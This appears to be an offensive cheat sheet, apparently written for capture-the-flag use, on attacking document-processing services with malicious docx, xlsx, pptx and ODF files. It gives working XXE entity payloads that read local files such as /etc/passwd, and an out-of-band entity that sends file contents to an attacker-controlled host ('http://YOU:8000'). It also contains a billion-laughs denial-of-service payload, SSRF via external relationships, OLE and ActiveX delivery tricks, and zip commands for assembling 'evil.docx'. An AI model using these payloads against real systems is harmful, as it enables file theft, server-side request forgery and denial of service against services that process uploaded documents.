# Office Formats Deep — OOXML/ODF internals for XXE and content injection

## OOXML — the zip-of-XML contract

docx/xlsx/pptx are zip containers. The XML parts a parser WILL touch:

```
[Content_Types].xml      — part-type registry
_rels/.rels              — root relationships
word/document.xml        — docx body text (w:t runs)
word/_rels/document.xml.rels — docx rels (external refs!)
docProps/core.xml        — dc:title/creator/subject metadata
docProps/app.xml         — app metadata
xl/workbook.xml          — workbook structure
xl/worksheets/sheetN.xml — cells
xl/sharedStrings.xml     — string table (echoed into cells)
xl/_rels/...             — rels
ppt/slides/slideN.xml
```

## XXE insertion points — where the entity lands

The ENTITY must appear in a part the app parses AND a reference that
surfaces:

- `word/document.xml` `<w:t>&x;</w:t>` — the text node — rendered text
- `docProps/core.xml` `<dc:title>&x;</dc:title>` — metadata that echoes
- `xl/sharedStrings.xml` `<t>&x;</t>` — cell text
- `word/footerN.xml`/`headerN.xml` — echoed into page renders
- `ppt/slides/slideN.xml` `<a:t>&x;</a:t>`
- `xl/comments.xml` — comment text
- `word/numbering.xml`, `styles.xml` — structural, rarely echoed

The `&x;` must resolve where the app reads it — if the app only stores the
zip, nothing fires; if it renders text back or generates a preview —
fired.

## The entity forms — local-read vs OOB

```xml
<!-- direct, needs the text surfaced in a response -->
<!DOCTYPE w:document [
  <!ENTITY x SYSTEM "file:///flag">
  <!ENTITY y SYSTEM "file:///etc/passwd">
]>

<!-- OOB — works when nothing reflects -->
<!DOCTYPE w:document [
  <!ENTITY % f SYSTEM "file:///flag">
  <!ENTITY % e "<!ENTITY ex SYSTEM 'http://YOU:8000/?d=%f;'>">
  %e;
]>
<w:document><w:body><w:p><w:r><w:t>&ex;</w:t></w:r></w:p></w:body></w:document>
```

The `%`-param DTD dance bypasses "external entities in internal subset"
limits — parameter entities defined via an external DTD escape the inline
restriction; the OOB exfil runs even when the document's text never
returns to you.

## External rels — the non-XXE fetch surface

`word/_rels/document.xml.rels` `<Relationship Target="http://x.tld">` —
hyperlink/image/media rels that renderers fetch (embedded images,
linked content) — an SSRF/fingerprinting hit without needing XXE.

`Target="file:///flag"` with `TargetMode="External"` — a consumer that
embeds external content (image previews in Word renderers, thumbnailers)
may open the local path.

## The XML-bomb variant — billion laughs inside a docx part

```xml
<!DOCTYPE r [
  <!ENTITY a "xxxxxxxxxx">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  ...
]>
```

Exponential expansion DoS — works if the parser is naive about entity
expansion caps.

## ODF (.odt/.ods/.odp) — different container, same family

```
content.xml        — body text
meta.xml           — metadata
styles.xml         — styles
META-INF/manifest.xml — file list
settings.xml       — config
```

Entity goes into `content.xml` `<text:p>&x;</text:p>` or `meta.xml`
`<dc:title>`.

## What the app does — identify the consumer's job

| Action | Attack |
|---|---|
| `docx→text extract` (resume search, indexing) | XXE lands in extracted text |
| `docx→html/pdf preview` | injected markup in the render + XXE |
| `docx→thumbnail` | rendered-pixel channel — put entity in a visible run |
| `xlsx→csv export` | cell values echo; formula injection survives |
| `docx template mail-merge` | fields get substituted → the entity or an injected field name reaches the merge |

## The `python-docx`/`docx4j`/`POI`/`OpenXML` safety split

- `python-docx` — uses lxml `resolve_entities=False` by default in most
  paths — XXE often dead; check `settings.xml`-level or a custom reader
- `docx4j`/`POI` — Java XML parsers — XXE depends on the `DocumentBuilder`
  config — try anyway
- LibreOffice headless conversion — real XML parser, entities resolve —
  the strongest XXE target
- PHPWord — PHP libxml — resolves per `LIBXML_*` flags

## Embed tricks that aren't XXE — OLE/objects

- `word/embeddings/` OLE objects — docx embeds files — the consumer may
  re-serve them intact; a `shell.exe` embed is a delivery vector
- `activeX`/`vml`/`oleObject` parts — ActiveX controls execute on open in
  MS Office (client-side, bot-scope)
- `word/vbaProject.bin` — macro-enabled docm — client-open only

## Crafting — the zip-surgery loop

```bash
unzip doc.docx -d x/
# edit x/word/document.xml — insert DOCTYPE + entity + ref
cd x && zip -r ../evil.docx '[Content_Types].xml' _rels docProps word
```

`[Content_Types].xml` must be the first entry for some readers —
re-zip carefully or use `zip evil.docx -0 -X '[Content_Types].xml'` then
add the rest.

## Falsifiers

- the parser is entity-disabled at every XML read
- nothing parses the doc — it's stored and re-served only

## Output to record

- the part+field carrying the entity + the surface where it reflected
- the verbatim excerpt or OOB line carrying file content
